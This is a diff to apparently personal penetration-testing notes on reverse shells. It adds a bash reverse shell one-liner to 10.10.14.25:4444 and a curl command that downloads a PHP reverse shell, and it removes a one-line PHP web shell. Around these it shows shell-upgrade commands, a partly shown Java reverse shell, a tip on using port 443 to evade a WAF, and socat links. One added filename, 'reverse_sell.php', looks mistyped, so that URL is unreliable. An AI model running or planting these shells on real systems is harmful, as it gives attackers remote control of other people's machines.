@@ -1,5 +1,10 @@
 ! Use 443 port to evade WAF.
 #shell
+
+#### Basic bash shell
+```bash
+echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
+```
 ##### Upgrade shell to fully interactive:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -8,6 +13,10 @@ stty size;stty raw -echo;fg
 #export SHELL=bash
 #stty rows $x columns $y #Set remote shell to x number of rows & y columns
 export TERM=xterm-256color #allows you to clear console, and have color output
+```
+or
+```bash
+script /dev/null bash
 ```
 Good shell
 ```
@@ -19,10 +28,8 @@ https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-che
 
 #### PHP
 #php
-https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_shell.php
-
-```php
-<?php system($_REQUEST["cmd"]); ?>
+```bash
+curl https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_sell.php > rsh.php
 ```
 
 ##### Java:
@@ -51,6 +58,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 ##### Socat port forwarding:
+[[port forwarding]]
 [[socat]] #bash #shell
 Download:
 https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
